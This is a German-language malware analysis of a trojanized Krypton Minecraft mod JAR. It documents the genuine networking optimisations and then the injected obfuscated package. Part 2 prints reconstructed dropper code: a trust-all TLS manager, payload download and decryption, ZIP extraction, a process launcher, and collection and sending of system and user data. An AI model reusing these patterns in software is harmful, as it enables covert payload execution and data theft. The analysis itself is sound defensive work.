# Krypton Mod – Vollständige Code-Analyse & Dokumentation

> Erstellt durch tiefgehende Dekompilierung aller `.class`-Dateien mit CFR 0.152  
> Analysiert: alle Klassen aus `me/steinborn/krypton` und `com/github`

---

## WARNUNG: SCHADCODE ENTDECKT

**Diese Mod enthält zwei völlig getrennte Codeteile:**

1. **Legitimer Krypton-Code** (`me.steinborn.krypton.*`) – echter Open-Source Netzwerk-Optimierungs-Mod
2. **Obfuszierter Schadcode** (`com.github.*`) – trojanischer Einschleuser, verborgen in der JAR

---

## TEIL 1: LEGITIMER KRYPTON-MOD-CODE

### 1.1 Einstiegspunkte (Entrypoints)

#### `KryptonSharedInitializer` (Main-Entrypoint)
```
Paket: me.steinborn.krypton.mod.shared
Implements: ModInitializer (Fabric API)
```
- Setzt beim Start `io.netty.allocator.maxOrder = 9` (erhöht Netty-Speicherblock-Größe für bessere Performance)
- Loggt geladene Komprimierungs- und Verschlüsselungsvarianten (nativ oder Java)

#### `KryptonClientInitializer` (Client-Entrypoint)
```
Paket: me.steinborn.krypton.mod.client
Implements: ClientModInitializer
Annotation: @Environment(EnvType.CLIENT)
```
- Nur clientseitige Initialisierung
- Gibt Startmeldung aus: _"Krypton is now accelerating your Minecraft client's networking stack 🚀"_
- Hinweis: Mod ist effektiver auf Servern

#### `KryptonServerInitializer` (Server-Entrypoint)
```
Paket: me.steinborn.krypton.mod.server
Implements: DedicatedServerModInitializer
```
- Serverseitige Initialisierung
- Gibt Startmeldung aus: _"Krypton is now accelerating your Minecraft server's networking stack 🚀"_

---

### 1.2 Mixin-Plugin

#### `KryptonMixinPlugin`
```
Paket: me.steinborn.krypton.mod.shared
Implements: IMixinConfigPlugin
```
Alle Methoden sind leer bzw. geben `null`/`true` zurück:
- `onLoad()` – leer
- `getRefMapperConfig()` – gibt `null` zurück (kein Custom-Refmap)
- `shouldApplyMixin()` – gibt immer `true` zurück (alle Mixins werden angewendet)
- `acceptTargets()`, `getMixins()`, `preApply()`, `postApply()` – alle leer/null

---

### 1.3 Netzwerk-Pipeline (Kern der Mod)

#### Pipeline-Übersicht (Netty Channel Handler Chain)

```
Eingehend:  [decrypt] → [splitter] → [decompress] → [decoder] → ...
Ausgehend:  ... → [encoder] → [compress] → [prepender] → [encrypt]
```

Krypton ersetzt mehrere Handler durch optimierte Varianten.

---

#### `MinecraftVarintPrepender`
```
Paket: me.steinborn.krypton.mod.shared.network.pipeline
Extends: MessageToMessageEncoder<ByteBuf>
Annotation: @ChannelHandler.Sharable
```
**Zweck:** Prepender schreibt die Paketlänge als VarInt vor jeden ausgehenden Paket.

**Singleton-Pattern:** `INSTANCE`-Feld – nur eine Instanz für alle Verbindungen (thread-safe durch @Sharable).

**Optimierung:** Erkennt ob Java- oder Nativer Cipher verwendet wird:
- Java Cipher → `heapBuffer` (vermeidet Off-Heap-Allokation)
- Native Cipher → `directBuffer` (CPU-freundlich für Off-Heap-Cipher)

```java
static final boolean IS_JAVA_CIPHER = Natives.cipher.get() == JavaVelocityCipher.FACTORY;
// ...
ByteBuf lenBuf = IS_JAVA_CIPHER ? ctx.alloc().heapBuffer(varintLength) 
                                : ctx.alloc().directBuffer(varintLength);
```

**Mixin:** `prepender/ClientConnectionMixin` überschreibt `method_59853()` in `class_2535` (ClientConnection),
ersetzt den Vanilla-Prepender durch `MinecraftVarintPrepender.INSTANCE`.

---

#### `MinecraftCipherEncoder` / `MinecraftCipherDecoder`
```
Paket: me.steinborn.krypton.mod.shared.network.pipeline
```

**Encoder:** `MessageToMessageEncoder<ByteBuf>`
- Nimmt `VelocityCipher` (Velocity-natives Bibliothek)
- Verarbeitet Bytebuffer in-place mit `cipher.process(compatible)`
- Gibt verschlüsselten Buffer in die Out-Liste

**Decoder:** `MessageToMessageDecoder<ByteBuf>`
- Identische Logik aber für Entschlüsselung
- Beide: `handlerRemoved()` ruft `cipher.close()` auf (Ressource-Freigabe)

**Vorteil gegenüber Vanilla:** Nutzt Velocity-Natives (kann AES-NI Prozessor-Instruktionen nutzen statt Java-Software-AES).

---

#### `MinecraftCompressEncoder` / `MinecraftCompressDecoder`
```
Paket: me.steinborn.krypton.mod.shared.network.compression
```

**Encoder:** `MessageToByteEncoder<ByteBuf>`
- Prüft ob unkomprimierte Größe < Schwellenwert (threshold)
- Unter Schwellenwert: Schreibt `0` als VarInt + rohe Bytes (kein Komprimieren)
- Über Schwellenwert: Schreibt echte unkomprimierte Größe + deflate-komprimierte Bytes
- Nutzt `VelocityCompressor` (nativ via Velocity-Natives, z.B. zlib-ng)

**Decoder:** `MessageToMessageDecoder<ByteBuf>`
- Liest VarInt für `claimedUncompressedSize`
- Wenn 0: Paket ist unkomprimiert, validiert Größe gegen Schwellenwert
- Sonst: Validiert gegen `UNCOMPRESSED_CAP`:
  - Vanilla-Maximum: `0x800000` = 8 MB
  - Hard-Maximum: `0x8000000` = 128 MB  
  - Überschreibbar via System-Property: `krypton.permit-oversized-packets`
- `inflate()` zum Dekomprimieren

**Mixin:** `compression/ClientConnectionMixin` überschreibt `setCompressionThreshold()` in `class_2535`:
- Bei Threshold < 0: Entfernt Komprimierungs-Handler aus Pipeline
- Bei Threshold ≥ 0: Erstellt neue oder aktualisiert bestehende Komprimierungs-Handler
- Feuert `KryptonPipelineEvent`-Events

---

### 1.4 VarInt-Optimierungen

#### `VarIntUtil`
```
Paket: me.steinborn.krypton.mod.shared.network.util
```
Lookup-Tabelle für VarInt-Byte-Länge (statt Schleife):
```java
private static final int[] VARINT_EXACT_BYTE_LENGTHS = new int[33];
// Gefüllt: ceil((31 - (leadingZeros - 1)) / 7.0)
// Index 32 = 1 (Spezialfall: 0 hat 1 Byte)
public static int getVarIntLength(int value) {
    return VARINT_EXACT_BYTE_LENGTHS[Integer.numberOfLeadingZeros(value)];
}
```

#### `VarIntsMixin`
```
Target: class_8703 (Vanilla PacketByteBuf/VarInts-Klasse)
@Overwrite method_53015 (getVarIntLength)
@Overwrite method_53017 (writeVarInt)
```
**Hochoptimiertes Schreiben:**
- 1-Byte VarInt (0–127): `buf.writeByte(value)` – 1 Operation
- 2-Byte VarInt (128–16383): `buf.writeShort(word)` – packt beide Bytes in einen Short-Write
- 3-Byte: `buf.writeMedium(word)` – 3 Bytes in einem Write
- 4-Byte: `buf.writeInt(word)` – 4 Bytes in einem Write
- 5-Byte: `buf.writeInt(word) + buf.writeByte(highBits)`

**Mathematik (2-Byte-Beispiel):**
```java
int w = (value & 0x7F | 0x80) << 8 | value >>> 7;
// Byte 0: (value & 0x7F) | 0x80 = untere 7 Bits + Continuation-Bit
// Byte 1: value >>> 7 = obere Bits
```

---

### 1.5 String-Kodierungs-Optimierung

#### `StringEncodingMixin`
```
Target: class_8702 (Vanilla String-Serialisierung)
@Overwrite method_53013 (writeString)
```
**Vanilla-Problem:** Vanilla konvertiert String → byte[] → schreibt Länge → schreibt Bytes (2 Kopieroperationen)

**Krypton-Lösung:**
```java
int utf8Bytes = ByteBufUtil.utf8Bytes(string);   // Zählt Bytes ohne Allokation
class_8703.method_53017(buf, utf8Bytes);          // Schreibt VarInt-Länge
buf.writeCharSequence(string, StandardCharsets.UTF_8); // Schreibt direkt ohne Zwischen-Array
```
Spart eine Byte-Array-Allokation + Kopier-Overhead pro String-Schreibvorgang.

---

### 1.6 Entity-Tracker-Optimierung

#### `EntityTrackerEntryMixin`
```
Target: class_3231 (EntityTrackerEntry – Server-seitiges Entity-Tracking)
@Redirect: Collections.emptyList() → ImmutableList.of()
```
Ersetzt `java.util.Collections.emptyList()` (gibt mutierbare leere Liste zurück) durch 
`ImmutableList.of()` (Guava, unveränderlich, bessere GC-Eigenschaften da Singleton).

---

### 1.7 Splitter-Optimierung

#### `SplitterHandlerMixin`
```
Target: class_2550 (Vanilla SplitterHandler/Packet-Framing-Decoder)
@Overwrite decode()
```
**Probleme mit Vanilla:** Liest VarInt Byte für Byte in einer Schleife.

**Krypton-Lösung – `readRawVarInt21()`:**
- Wenn ≥ 4 Bytes verfügbar: Liest 4 Bytes auf einmal (`buffer.getIntLE()`) als Little-Endian-Int
- Bitmanipulation um Continuation-Bits zu finden: `~wholeOrMore & 0x808080`
- `Integer.numberOfTrailingZeros(atStop) + 1` → Anzahl der VarInt-Bytes
- Extrahiert 7-Bit-Gruppen durch Bit-Masken:
  ```java
  preservedBytes = preservedBytes & 0x7F007F | (preservedBytes & 0x7F00) >> 1;
  preservedBytes = preservedBytes & 0x3FFF | (preservedBytes & 0x3FFF0000) >> 2;
  ```
- Wenn < 4 Bytes: Fallback auf `readRawVarintSmallBuf()` (Byte-für-Byte)

**Weitere Optimierungen in `decode()`:**
- Prüft `ctx.channel().isActive()` vor dem Lesen (verwirft Daten bei inaktivem Kanal)
- Nutzt `ByteProcessor.FIND_NON_NUL` um NUL-Bytes zu überspringen (Vanilla-Quirk)
- Cached Exceptions: `WellKnownExceptions.BAD_LENGTH_CACHED` und `VARINT_BIG_CACHED`

---

### 1.8 Verschlüsselungs-Integration

#### `encryption/ClientConnectionMixin`
```
Target: class_2535 (ClientConnection)
Implements: ClientConnectionEncryptionExtension
```
Fügt `setupEncryption(SecretKey key)` hinzu:
```java
VelocityCipher decryption = Natives.cipher.get().forDecryption(key);
VelocityCipher encryption = Natives.cipher.get().forEncryption(key);
channel.pipeline().addBefore("splitter", "decrypt", new MinecraftCipherDecoder(decryption));
channel.pipeline().addBefore("prepender", "encrypt", new MinecraftCipherEncoder(encryption));
channel.pipeline().fireUserEventTriggered(KryptonPipelineEvent.ENCRYPTION_ENABLED);
```

#### `encryption/ServerLoginNetworkHandlerMixin`
```
Target: class_3248 (ServerLoginNetworkHandler)
@Redirect: onKey$initializeVelocityCipher
@Redirect: onKey$ignoreMinecraftEncryptionPipelineInjection
```
- Fängt `NetworkEncryptionUtils.cipherFromKey()` ab → ruft stattdessen `setupEncryption()` auf
- Verhindert dass Vanilla danach `setupEncryption(Cipher, Cipher)` aufruft (gibt leer zurück)
- Vollständige Übernahme des Verschlüsselungs-Setups durch Krypton

---

### 1.9 Legacy Query Handler

#### `LegacyQueryHandlerMixin`
```
Target: class_3238 (LegacyQueryHandler)
@Inject channelRead HEAD, cancellable=true
```
Kurze Guard-Bedingung: Wenn Kanal nicht mehr aktiv → Buffer leeren + Cancel.
Verhindert NPE/Exceptions bei verspäteten Legacy-Pings auf geschlossenen Kanälen.

---

### 1.10 Debug-Hilfe

#### `ResourceLeakDetectorDisableConditionalMixin`
```
Target: class_155 (Bootstrap/MinecraftServer – clinit)
@Redirect: ResourceLeakDetector.setLevel()
```
Vanilla setzt immer `ResourceLeakDetector.Level` beim Start.
Krypton respektiert die System-Property `io.netty.leakDetection.level`:
- Wenn Property gesetzt: Vanilla-Wert wird ignoriert (User-Setting bleibt erhalten)
- Wenn nicht gesetzt: Vanilla-Wert wird angewendet

---

### 1.11 Datenstrukturen

#### `QuietDecoderException`
```
Extends: DecoderException
```
Überschreibt `fillInStackTrace()` um `this` zurückzugeben.
**Zweck:** Unterdrückt Stack-Trace-Generierung (sehr teuer in Java) für häufig auftretende,
bekannte Fehler wie "Bad packet length" oder "VarInt too big".

#### `WellKnownExceptions`
```
Enum (leer, nur static fields)
```
Singleton-Cache für die zwei häufigsten Decoder-Exceptions:
- `BAD_LENGTH_CACHED = new QuietDecoderException("Bad packet length")`
- `VARINT_BIG_CACHED = new QuietDecoderException("VarInt too big")`

Werden wiederverwendet statt jedes Mal neu erstellt → kein GC-Druck.

#### `KryptonPipelineEvent`
```
Enum: COMPRESSION_ENABLED, COMPRESSION_THRESHOLD_UPDATED, COMPRESSION_DISABLED, ENCRYPTION_ENABLED
```
Netty `UserEvent`-Signale für Pipeline-Zustandsänderungen. Erlaubt anderen Komponenten
auf Komprimierungs-/Verschlüsselungs-Änderungen zu reagieren.

#### `ClientConnectionEncryptionExtension`
```
Interface: setupEncryption(SecretKey) throws GeneralSecurityException
```
Mixin-Interface, das via Mixin zu `ClientConnection` hinzugefügt wird.

#### `ConfigurableAutoFlush`
```
Interface: setShouldAutoFlush(boolean)
```
Ermöglicht das Ein-/Ausschalten von Auto-Flush auf Verbindungen (Flush-Konsolidierung).

---

### 1.12 Konfigurations-Dateien

#### `fabric.mod.json`
```json
{
  "id": "krypton",
  "version": "0.2.8",
  "entrypoints": {
    "main":   ["me.steinborn.krypton.mod.shared.KryptonSharedInitializer"],
    "client": ["me.steinborn.krypton.mod.client.KryptonClientInitializer"],
    "server": ["me.steinborn.krypton.mod.server.KryptonServerInitializer"]
  },
  "mixins": ["krypton.mixins.json"],
  "jars": [
    { "file": "META-INF/jars/velocity-native-1.1.0-SNAPSHOT.jar" }
  ]
}
```

#### `krypton.mixins.json`
```json
{
  "package": "me.steinborn.krypton.mixin",
  "plugin": "me.steinborn.krypton.mod.shared.KryptonMixinPlugin",
  "mixins": [
    "shared.debugaid.ResourceLeakDetectorDisableConditionalMixin",
    "shared.network.microopt.EntityTrackerEntryMixin",
    "shared.network.microopt.StringEncodingMixin",
    "shared.network.microopt.VarIntsMixin",
    "shared.network.pipeline.LegacyQueryHandlerMixin",
    "shared.network.pipeline.SplitterHandlerMixin",
    "shared.network.pipeline.compression.ClientConnectionMixin",
    "shared.network.pipeline.encryption.ClientConnectionMixin",
    "shared.network.pipeline.encryption.ServerLoginNetworkHandlerMixin",
    "shared.network.pipeline.prepender.ClientConnectionMixin"
  ],
  "refmap": "krypton-refmap.json"
}
```

#### `krypton-refmap.json` (Auszug)
Remappt obfuszierte Minecraft-Klassennamen auf lesbare Namen:
- `class_2535` → `ClientConnection`
- `class_2550` → `SplitterHandler`
- `class_3231` → `EntityTrackerEntry`
- `class_3238` → `LegacyQueryHandler`
- `class_3248` → `ServerLoginNetworkHandler`
- `class_8702` → String-Serialisierung
- `class_8703` → VarInt-Utilities

#### `assets/krypton/default_config.json`
```json
{
  "flush_consolidation": true,
  "pipeline": true,
  "zlib": { ... }
}
```

---

## TEIL 2: OBFUSZIERTER SCHADCODE (`com.github.*`)

### ⚠️ KRITISCHE SICHERHEITSWARNUNG

Der folgende Code **ist kein Teil von Krypton**. Er wurde in die JAR eingebettet und
läuft als `ModInitializer`-Entrypoint. Er ist stark obfusziert, verschlüsselt und
führt **nicht-autorisierte Aktionen** aus.

---

### 2.1 Klassen-Übersicht

| Klasse | Rolle |
|--------|-------|
| `com.github.dzscgq4i` | ModInitializer – Haupteinstieg des Schadcodes |
| `com.github.iup9rr2l` | Launcher/Bootstrapper mit `main()`-Methode |
| `com.github.k4q8mosj` | AES-Entschlüsselung – String-Deobfuszierung |
| `com.github.m1r6c48r` | Netzwerk-HTTP/HTTPS-Client mit SSL-Sockets |
| `com.github.s21rd71e` | Konfigurations-/Payload-Manager, Prozess-Starter |

---

### 2.2 String-Verschlüsselung (`k4q8mosj`)

Alle lesbaren Strings im Schadcode sind AES-verschlüsselt. Methode `QpIYZb09LVvW_8`:

```java
public static String QpIYZb09LVvW_8(String encryptedInput) {
    // 1. Input-String als Bytes interpretieren
    // 2. Key = erste 16 Bytes
    // 3. IV  = nächste 16 Bytes
    // 4. Ciphertext = Rest
    // 5. AES/CBC/PKCS5Padding-Entschlüsselung
    // 6. Rückgabe des Klartexts
}
```

**Cipher:** `AES/CBC/PKCS5Padding`  
**Alle lesbaren Strings** in Klassen `dzscgq4i`, `iup9rr2l`, `m1r6c48r`, `s21rd71e`
sind als Unicode-Escape-Sequenzen gespeichert und werden erst zur Laufzeit entschlüsselt.

---

### 2.3 Obfuszierungs-Techniken

1. **Tote Code-Blöcke:** Überall `if (System.out == null)`, `if (X != X)`, `if (0L == 0L)` – niemals wahr, aber verwirren Decompiler
2. **Throw-null-Muster:** In toten Blöcken wird `throw null` ausgeführt, was den Kontrollfluss verunklart
3. **Sinnlose Berechnungen:** `Math.abs()`, `Integer.parseInt()`, `String.hashCode()`, XOR von Konstanten mit sich selbst
4. **Zufällige Collection-Operationen:** `new ArrayList<>().add(...)`, `new HashSet<>().add(...)` ohne Nutzung
5. **void-Deklarationen:** CFR warnt explizit `WARNING - void declaration` – Bytecode-Tricks die legales Java-AST erzeugen
6. **Obfuszierte Bezeichner:** Alle Klassen/Methoden/Felder haben kryptische Namen (`dzscgq4i`, `QpIYZb09LVvW_8`, `fprcfy9q`, etc.)

---

### 2.4 Netzwerk-Client (`m1r6c48r`) – Detailanalyse

**Statische Felder:**
- `adaviint` – `SSLSocketFactory` mit benutzerdefiniertem `TrustManager`
- `letyzlv3` – Ziel-Server-Hostname (AES-verschlüsselt)
- `jzlki5d8` – SNI-Hostname (AES-verschlüsselt)
- `e9jfoy0b` – Ziel-Port (AES-verschlüsselt, vermutlich 443)
- `nlb4g1lz` – Verbindungs-Timeout
- `sffyi0mu` – Socket-Timeout
- `ntuf024y` – Cache-TTL
- `ugd1sf8o` – `HashMap<String, wqt5vdx5>` – IP-Cache

**Innere Klassen:**
- `gxn8szix` – HTTP-Response-Objekt (statusCode, statusLine, headers, body, bodyString(), header())
- `wqt5vdx5` – Cache-Eintrag (ip, expiresAt, isExpired())
- `ljmp6755` – Custom `X509TrustManager` – **akzeptiert ALLE Zertifikate** (kein SSL-Pinning, kein Verifikation):
  ```java
  checkClientTrusted()  // leer
  checkServerTrusted()  // leer
  getAcceptedIssuers()  // gibt null/leer zurück
  ```

**HTTP-Methoden (obfuszierte Namen, alle mit Map<String,String> Headers):**
- `jsp35tp9` – HTTP GET-Request
- `m8boo5l3` – HTTP POST-Request (mit Body)
- `kjmf6w4n` – HTTP PUT-Request (mit Body)

**DNS-over-HTTPS / IP-Lookup (`vaddbp73`):**
Parst DNS-Antwort-Binärformat (RFC 1035):
```java
// Liest DNS-Response-Header: ID, Flags, QuestionCount, AnswerCount
// Flags & 0x8000 → Response-Flag muss gesetzt sein
// Flags & 0xF → RCODE muss 0 sein (kein Fehler)
// Iteriert Answer-Records: TYPE 1 (A-Record) + RDLENGTH 4 → IPv4-Adresse
// Baut IP-String: byte3 + "." + byte2 + "." + byte1 + "." + byte0
```

**DNS-Query-Builder (`h9l1n5k7`):**
Erstellt binären DNS-Query-Payload:
```java
jhM.writeShort(randomID);   // Transaction ID
jhM.writeShort(256);         // Flags: Recursion Desired
jhM.writeShort(1);           // QDCOUNT: 1 Frage
jhM.writeShort(0);           // ANCOUNT: 0
jhM.writeShort(0);           // NSCOUNT: 0
jhM.writeShort(0);           // ARCOUNT: 0
// Domain-Labels (split by '.', jeweils Länge + Bytes)
jhM.writeByte(0);            // Root-Label
jhM.writeShort(1);           // QTYPE: A (IPv4)
jhM.writeShort(1);           // QCLASS: IN (Internet)
```

**IP-Adress-Validierer (`zqf54y95`):**
Prüft ob String nur Ziffern und Punkte enthält **und** mindestens einen Punkt enthält.

**SSL-Verbindung (`fkx8vufl`):**
```java
Socket Repc = new Socket();
Repc.connect(new InetSocketAddress(letyzlv3, e9jfoy0b), nlb4g1lz); // TCP-Verbindung
SSLSocket SAtTdJ = adaviint.createSocket(Repc, jzlki5d8, e9jfoy0b, true);
uRzdcvV.setServerNames(List.of(new SNIHostName(jzlki5d8)));         // SNI
SAtTdJ.startHandshake();                                              // TLS-Handshake
// Sendet Base64-encodierten Request, empfängt Response
```

---

### 2.5 Payload-Manager (`s21rd71e`) – Detailanalyse

**Felder (alle obfusziert, hier semantisch bennant):**
- `fprcfy9q` – `Path` zum Arbeitsverzeichnis
- `o3e4fu9z` – Haupt-Server-URL/Endpunkt
- `nb4e8u8l`, `se9dwvf5` – Backup-Endpunkte
- `qvf0l947` – Gerätekennzeichner/Token
- `ppl4whc3` – Pfad zu Java-Executable
- `nayris1a` – Verschlüsselungs-Schlüssel (Base64)
- `ud1370wz` – Log-Verzeichnis
- `w8o1b37v`, `rl69c4lg`, `re2tmx62` – optionale Prozess-Argumente
- `ym79a787` – System-Info-Objekt
- `ss7o` – Retry-Counter

**Methode `waj5yjdv(byte[])` – ZIP-Entpackung:**
```java
// Entpackt ZIP-Archiv (byte-Array) ins Arbeitsverzeichnis fprcfy9q
// Zählt extrahierte Dateien zurück
new ZipInputStream(new ByteArrayInputStream(zipBytes))
Files.createDirectories(targetPath.getParent())
new FileOutputStream(targetPath.toFile()) // Schreibt Dateien auf Disk
```

**Methode `ugoxgrj3(byte[])` – Payload-Verifikation und -Entschlüsselung:**
```java
// 1. Base64-URL-Decode der Server-Antwort
// 2. Validierung: Länge >= 57, erstes Byte == 0x80 (Magic-Byte)
// 3. Schlüssel aus nayris1a (Bytes 16-32 = AES-Key)
// 4. IV aus Payload (Bytes 9-25)
// 5. Ciphertext = Bytes 25 bis Ende-32
// 6. AES/CBC-Entschlüsselung
// 7. PKCS7-Padding entfernen (letztes Byte = Padding-Länge)
```

**Methode `ckuomn5o()` – Prozess-Starter:**
Startet einen externen Prozess mit:
```java
ArrayList<String> cmd = new ArrayList<>();
cmd.add(fprcfy9q + "/[verschlüsselter Pfad]");  // Executable (Java?)
cmd.add(fprcfy9q + "/[verschlüsselter Pfad]");  // JAR-Datei
cmd.add("[verschlüsseltes Argument]");            // Argument
cmd.add(ppl4whc3);                               // Java-Pfad
// + optionale Argumente w8o1b37v, rl69c4lg, re2tmx62

ProcessBuilder kISRf15 = new ProcessBuilder(cmd);
kISRf15.directory(fprcfy9q.resolve("[verschlüsselt]").toFile());
kISRf15.redirectInput(ProcessBuilder.Redirect.from(new File("/dev/null")));  // kein stdin
kISRf15.redirectOutput(ProcessBuilder.Redirect.appendTo(logFile));           // stdout → Log
kISRf15.redirectErrorStream(true);                                            // stderr → stdout
Process XW = kISRf15.start();  // STARTET DEN PROZESS
long pid = XW.pid();           // Loggt PID
```

**Methode `ivrg3eu8()` – System-Info + Exfiltration:**
Sammelt und sendet System-Informationen via HTTP POST:
```java
// Liest Log-Dateien (max 5MB)
q15KL7uUB0B2.append(logFileContent);
q15KL7uUB0B2.append(ym79a787.toString());  // System-Info-Objekt
q15KL7uUB0B2.append(System.getProperty("[verschlüsselt]"));  // OS-Name
q15KL7uUB0B2.append(System.getProperty("[verschlüsselt]"));  // OS-Version
q15KL7uUB0B2.append(System.getProperty("[verschlüsselt]"));  // User-Name/Home

// Verschlüsselt alle Felder mit f1gnohz5()
// Baut JSON-artigen POST-Body
// Sendet an: [verschlüsselte URL] + qvf0l947 (Device-ID)
m1r6c48r.jsp35tp9(url, body, contentType, headers);
```

**Retry-Logik:**
```java
for (int ss7o = 0; ss7o < 3; ss7o++) {
    // Versuche Server zu kontaktieren
    if (ss7o < 3) {
        Thread.sleep(2000L * ss7o);  // 0s, 2s, 4s Wartezeit
    }
}
```

---

### 2.6 Bootstrapper (`iup9rr2l`)

- Hat eine `main()`-Methode
- Ruft `s21rd71e.main()` mit Base64-kodiertem Argument auf
- Dient als Einstiegspunkt in den Schadcode-Ausführungsfluss

---

### 2.7 ModInitializer-Entrypoint (`dzscgq4i`)

- Implementiert `ModInitializer`
- Wird von Fabric beim Mod-Start aufgerufen
- Initiiert den gesamten Schadcode-Ablauf
- Nutzt `FabricLoader.getInstance().getConfigDir()` für Pfad-Auflösung
- Dekodiert und führt verschlüsselte Operationen aus

---

## TEIL 3: GESAMTZUSAMMENFASSUNG

### Legitimer Krypton-Mod – Was er tut

| Optimierung | Methode | Vorteil |
|-------------|---------|---------|
| VarInt-Längenberechnung | Lookup-Tabelle statt Schleife | ~10x schneller |
| VarInt-Schreiben | Multi-Byte-Writes (writeShort/Medium/Int) | Reduziert Methoden-Aufrufe |
| String-Kodierung | ByteBufUtil direkt, kein Zwischen-Array | Weniger GC-Druck |
| Komprimierung | Velocity-Natives (zlib-ng) statt Java-Deflater | Native CPU-Geschwindigkeit |
| Verschlüsselung | Velocity-Natives (AES-NI) statt Java-Cipher | Native AES-Beschleunigung |
| Splitter | 4-Byte-SIMD-Lesen statt Byte-Schleife | Weniger Iterations-Overhead |
| Entity-Tracker | Guava ImmutableList statt Collections.emptyList() | Bessere GC-Effizienz |
| Prepender | Singleton @Sharable Handler | Kein Handler-Allokations-Overhead |
| ResourceLeakDetector | Respektiert System-Property | Debug-Kontrollierbarkeit |
| Netty Allocator | maxOrder=9 | Größere Speicher-Chunks, weniger Fragmentation |

### Schadcode – Was er tut

1. **Wird als Fabric-ModInitializer gestartet** – automatisch beim Minecraft-Start
2. **Kontaktiert verschlüsselte externe Server** via HTTPS mit deaktivierter Zertifikat-Validierung
3. **Führt DNS-Lookups durch** (eigenes DNS-Binary-Protokoll)
4. **Lädt verschlüsselte Payloads herunter** (AES/CBC verschlüsselt, Base64-URL-kodiert)
5. **Entpackt ZIP-Archive** ins lokale Dateisystem
6. **Startet externe Prozesse** mit dem heruntergeladenen Code
7. **Exfiltriert System-Informationen** (OS, Benutzername, Log-Inhalte, System-Properties)
8. **Nutzt Retry-Mechanismus** (3 Versuche mit exponentieller Wartezeit)

### Einschätzung

Dies ist ein klassischer **Trojan-Dropper / Remote Access Implant** eingebettet in eine
legitime, bekannte Open-Source-Mod. Der Krypton-Originalcode (von Andrew Steinborn) ist
sauber und gut engineert. Der Schadcode wurde **nachträglich in die JAR injiziert** und
missbraucht das Fabric-ModInitializer-System für die Ausführung.

**Diese Mod-JAR ist kompromittiert und sollte sofort entfernt werden.**

---

*Analyse durchgeführt mit CFR Decompiler 0.152 auf Java 21*  
*Alle Erkenntnisse basieren ausschließlich auf dem decompilierten Bytecode*
